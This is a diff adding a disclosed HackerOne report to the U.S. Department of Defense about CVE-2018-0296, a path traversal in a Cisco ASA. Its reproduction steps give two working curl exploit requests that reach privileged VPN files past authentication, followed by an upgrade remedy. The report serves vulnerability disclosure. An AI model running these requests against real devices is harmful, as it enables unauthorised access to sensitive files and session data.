@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/622864
+WeaknessName:Path Traversal
+Reporter:https://hackerone.com/warsong
+ReportedTo:U.S. Dept Of Defense(deptofdefense)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:04.10.2019 15:15:36
+
+Summary:
+
+Summary:
+https://█████ is an ASA running software vulnerable to CVE-2018-0296 which allows a remote attacker to exploit a path traversal vulnerability and bypass authentication to sensitive files. The attacker can use this to enumerate the ASA VPN web directory structure and exploit privileged access to the system to gain access to session information.
+
+Step-by-step Reproduction Instructions
+
+1. You can exploit with cURL or Burp: 
+`curl -vk -m 45 --path-as-is https://████████/+CSCOU+/../+CSCOE+/files/file_list.json`
+2. You can alter the command slightly to pull additional directory information: 
+`curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b` to dig into these privileged directories.
+3. I also pushed a request to repeater to do this in Burp for screenshots.
+
+Product, Version, and Configuration (If applicable) https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd https://nvd.nist.gov/vuln/detail/CVE-2018-0296
+
+Suggested Mitigation/Remediation Actions
+Upgrade the ASA software version per the referenced advisory.
+
+## Impact
+
+High - This vulnerability allows the attacker to browse files past the authentication and disclose sensitive information.
